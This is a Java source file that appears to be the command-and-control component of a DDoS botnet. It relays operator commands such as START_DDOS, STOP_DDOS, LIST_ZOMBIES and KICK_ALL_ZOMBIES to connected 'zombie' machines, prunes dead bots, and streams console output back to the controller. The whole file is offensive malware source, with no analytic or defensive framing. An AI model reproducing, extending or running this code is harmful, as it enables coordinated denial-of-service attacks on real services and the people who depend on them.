package org.ddos.server;

import java.io.IOException;
import java.net.SocketAddress;
import java.util.ArrayList;

import org.ddos.util.Computer;
import org.jnetwork.DataPackage;
import org.jnetwork.Server;
import org.jnetwork.SocketPackage;

public class ClientCycle {
	private boolean isForwardingConsoleOutput = false;
	private SocketPackage event;

	public void start(DDOSServer ddosServer, Server server, SocketPackage event)
			throws ClassNotFoundException, IOException {
		this.event = event;
		while (!event.getConnection().isClosed()) {
			DataPackage pkgIn = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
			println("Package received: " + pkgIn.getMessage() + " (ID: " + pkgIn.getId() + ")");
			if (pkgIn.getMessage().equals("START_DDOS")) {
				for (SocketPackage zombie : server.getClients()) {
					if ((boolean) zombie.getExtraData()[0]) {
						if (zombie.getExtraData()[1] != null) {
							zombie.getOutputStream().writeObject(new DataPackage().setMessage("STOP_DDOS"));
						}
						zombie.getOutputStream().writeObject(pkgIn);
						server.setConnectionData(zombie, true, pkgIn.getObjects()[0]);
					}
				}
			} else if (pkgIn.getMessage().equals("STOP_DDOS")) {
				for (SocketPackage zombie : server.getClientsByData(true, pkgIn.getObjects()[0])) {
					zombie.getOutputStream().writeObject(pkgIn);
					server.setConnectionData(zombie, true, null);
				}
			} else if (pkgIn.getMessage().equals("KICK_ZOMBIES")) {
				for (SocketAddress zombie : (SocketAddress[]) pkgIn.getObjects()) {
					server.removeClient(zombie);
				}
			} else if (pkgIn.getMessage().equals("LIST_ZOMBIES")) {
				ArrayList<Computer> computers = new ArrayList<>();
				for (SocketPackage pkg : server.getClients()) {
					if ((boolean) pkg.getExtraData()[0]) {
						computers.add(new Computer(pkg.getConnection().getRemoteSocketAddress(), true));
					}
				}

				event.getOutputStream().writeObject(
						new DataPackage(computers.toArray(new Computer[computers.size()])).setMessage("ALL_ZOMBIES"));
			} else if (pkgIn.getMessage().equals("KICK_ALL_ZOMBIES")) {
				for (SocketPackage zombie : server.getClients()) {
					if ((boolean) zombie.getExtraData()[0]) {
						server.removeClient(zombie);
					}
				}
			} else if (pkgIn.getMessage().equals("REMOVE_DEAD_ZOMBIES")) {
				for (SocketPackage zombie : server.getClients()) {
					if ((boolean) zombie.getExtraData()[0]) {
						try {
							zombie.getOutputStream().writeObject(new DataPackage().setMessage("DEAD_ZOMBIE_CHECK"));
						} catch (IOException e) {
							System.out.println(
									"Removing dead zombie: " + zombie.getConnection().getRemoteSocketAddress());
							server.removeClient(zombie);
						}
					}
				}
			} else if (pkgIn.getMessage().equals("START_READ_SERVER")) {
				this.isForwardingConsoleOutput = true;
				ddosServer.readingClients.add(event);
			} else if (pkgIn.getMessage().equals("STOP_READ_SERVER")) {
				this.isForwardingConsoleOutput = false;
				ddosServer.readingClients.remove(event);
			} else if (pkgIn.getMessage().equals("START_READ_ZOMBIE")) {
				server.getClient((SocketAddress) pkgIn.getObjects()[0]).getOutputStream()
						.writeObject(new DataPackage(event.getConnection().getRemoteSocketAddress())
								.setMessage("START_READ_ZOMBIE"));
			} else if (pkgIn.getMessage().equals("STOP_READ_ZOMBIE")) {
				server.getClient((SocketAddress) pkgIn.getObjects()[0]).getOutputStream().writeObject(
						new DataPackage(event.getConnection().getRemoteSocketAddress()).setMessage("STOP_READ_ZOMBIE"));
			} else if (pkgIn.getMessage().equals("LIST_ALL")) {
				ArrayList<Computer> computers = new ArrayList<>();
				for (SocketPackage pkg : server.getClients()) {
					computers.add(new Computer(pkg.getConnection().getRemoteSocketAddress(),
							(boolean) pkg.getExtraData()[0]));
				}

				event.getOutputStream().writeObject(
						new DataPackage(computers.toArray(new Computer[computers.size()])).setMessage("ALL_COMPUTERS"));
			}
		}
	}

	private void println(Object o) throws IOException {
		System.out.println(o);

		if (isForwardingConsoleOutput)
			event.getOutputStream().writeObject(new DataPackage(o.toString()).setMessage("SERVER_CONSOLE_OUTPUT"));
	}
}
